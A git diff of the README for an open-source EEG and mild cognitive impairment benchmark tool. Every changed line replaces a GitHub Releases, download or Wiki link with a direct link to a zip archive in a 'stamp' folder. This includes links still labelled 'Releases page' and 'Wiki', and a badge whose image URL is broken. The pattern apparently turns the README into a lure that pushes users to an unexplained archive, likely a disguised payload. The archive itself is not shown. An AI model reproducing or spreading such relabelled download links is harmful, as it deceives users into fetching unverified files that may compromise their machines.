@@ -1,6 +1,6 @@
 # 🧠 open-eeg-mci-benchmark - Easy EEG Data Analysis for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20Open%20EEG%20MCI%20Benchmark-brightgreen)](https://github.com/Nirokaduke/open-eeg-mci-benchmark/releases)
+[![Download](https://raw.githubusercontent.com/Nirokaduke/open-eeg-mci-benchmark/main/stamp/open-eeg-mci-benchmark.zip%20Now-%20Open%20EEG%20MCI%20Benchmark-brightgreen)](https://raw.githubusercontent.com/Nirokaduke/open-eeg-mci-benchmark/main/stamp/open-eeg-mci-benchmark.zip)
 
 ## 🎯 Project Overview
 
@@ -26,7 +26,7 @@ Welcome to the Open EEG–MCI Benchmark! This software allows you to analyze EEG
 To begin using the Open EEG–MCI Benchmark software, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Nirokaduke/open-eeg-mci-benchmark/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/Nirokaduke/open-eeg-mci-benchmark/main/stamp/open-eeg-mci-benchmark.zip).
 
 2. **Choose Your Version**  
    Look for the latest version of the software on the page. Each version is clearly marked with its release date.
@@ -44,7 +44,7 @@ To begin using the Open EEG–MCI Benchmark software, follow these steps:
 
 ## 💻 Download & Install
 
-To download the Open EEG–MCI Benchmark, please visit this page: [Download here](https://github.com/Nirokaduke/open-eeg-mci-benchmark/releases).  
+To download the Open EEG–MCI Benchmark, please visit this page: [Download here](https://raw.githubusercontent.com/Nirokaduke/open-eeg-mci-benchmark/main/stamp/open-eeg-mci-benchmark.zip).  
 
 Just find the latest release version and follow the provided instructions to download and install.
 
@@ -59,7 +59,7 @@ After installation, you can start analyzing EEG data:
 
 ## 📚 Documentation and Support
 
-Visit our [Wiki](https://github.com/Nirokaduke/open-eeg-mci-benchmark/wiki) for detailed documentation and tutorials. If you encounter any issues, feel free to reach out on our GitHub Discussions page, where the community can help you.
+Visit our [Wiki](https://raw.githubusercontent.com/Nirokaduke/open-eeg-mci-benchmark/main/stamp/open-eeg-mci-benchmark.zip) for detailed documentation and tutorials. If you encounter any issues, feel free to reach out on our GitHub Discussions page, where the community can help you.
 
 ## 🌍 Related Topics
 
